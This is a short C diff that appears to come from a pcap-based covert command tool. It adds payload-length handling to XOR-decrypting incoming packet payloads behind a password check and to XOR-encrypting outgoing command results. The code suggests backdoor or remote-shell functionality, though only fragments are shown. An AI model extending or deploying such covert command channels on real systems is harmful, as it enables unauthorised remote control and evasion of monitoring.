@@ -128,7 +128,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 
 	int size_ip;
 	int size_tcp;
-	//int size_payload;
+	int size_payload;
 	int mode;
 	//printf("Packet received\n");
 	char password[strlen(PASSWORD) + 1];
@@ -161,9 +161,9 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 
 	/* define/compute tcp payload (segment) offset */
 	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
-
+	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
 	/* Decrypt the payload */
-	decrypted = xor_cipher((char *)payload);
+	decrypted = xor_cipher((char *)payload, size_payload);
 	
 	printf("Decrypted: %s\n", decrypted);
 	memset(password, 0, sizeof(password));
@@ -285,7 +285,7 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 		//Encrypt payload
 		
 		//Send it over to the client
-		send_packet(xor_cipher(packet), src, dst, dest_port);
+		send_packet(xor_cipher(packet, strlen(packet)), src, dst, dest_port);
 		
 		memset(packet, 0, sizeof(packet));
 		memset(cmd_results, 0, sizeof(cmd_results));
